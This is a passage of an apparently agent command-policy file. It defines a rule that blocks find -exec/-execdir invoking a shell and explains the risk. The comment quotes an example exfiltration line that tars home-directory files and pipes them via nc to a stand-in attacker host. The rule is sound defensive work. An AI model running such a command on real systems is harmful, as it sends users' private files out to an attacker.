  #   find /home -readable -exec sh -c 'tar czf - "$1" | nc evil.com 4444' _ {} \;
  #
  # This is more dangerous than plain find -exec because:
  # 1. The shell -c invocation can contain arbitrary pipelines, redirections
  # 2. -execdir changes to the file's directory, enabling relative path attacks
  # 3. Combined with broad find predicates (-writable, -readable), scales to
  #    mass file modification or exfiltration
  #
  # The existing ts-block-suid-find-exec only catches SUID discovery + exec.
  # This rule catches the general pattern of find + shell interpreter.
  # =========================================================================

  # --- BLOCK: find -exec/-execdir with shell interpreter ---
  - id: "ts-block-find-exec-shell"
    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
    match:
      command_regex: "find\\s+.*-exec(dir)?\\s+(sh|bash|zsh|dash|ksh)\\s+-c\\s"
    decision: "BLOCK"
    confidence: 0.90
    reason: "find with -exec/-execdir invoking a shell interpreter (sh -c, bash -c) enables arbitrary code execution over every matched file. Chains file discovery with unrestricted shell commands — can mass-modify, inject backdoors, or exfiltrate file contents at scale. MITRE T1059.004."

